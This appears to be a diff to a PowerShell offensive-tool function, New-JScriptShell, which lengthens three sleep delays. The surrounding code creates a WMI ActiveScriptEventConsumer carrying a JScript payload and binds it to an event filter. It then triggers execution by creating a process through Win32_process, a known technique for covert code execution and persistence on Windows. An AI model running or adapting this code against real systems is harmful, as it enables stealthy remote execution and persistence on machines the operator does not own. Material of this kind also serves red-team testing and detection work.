@@ -116,7 +116,7 @@ function New-JScriptShell {
         ScriptingEngine = 'JScript'
         ScriptText = $Payload
     }
-    Start-Sleep -Seconds 3
+    Start-Sleep -Seconds 10
     Write-Verbose "[*] Creating the consumer"
     $Consumer =  Set-WmiInstance -Namespace root\subscription -Class ActiveScriptEventConsumer -Arguments $ActiveScriptEventConsumerArgs @commonArgs
 
@@ -124,12 +124,12 @@ function New-JScriptShell {
         Filter = $Filter
         Consumer = $Consumer
     }
-    Start-Sleep -Seconds 3
+    Start-Sleep -Seconds 10
     Write-Verbose "[*] Creating the wmi filter to consumer binding"
     $FilterToConsumerBinding = Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $FilterToConsumerArgs @commonArgs
 
     Write-Verbose "[*] Executing process trigger"
-    Start-Sleep -Seconds 5
+    Start-Sleep -Seconds 10
     $result = Invoke-WmiMethod -Class Win32_process -Name Create -ArgumentList "$ProcessName" @commonArgs
     if ($result.returnValue -ne 0) {
         Write-Verbose "Trigger process was not started"
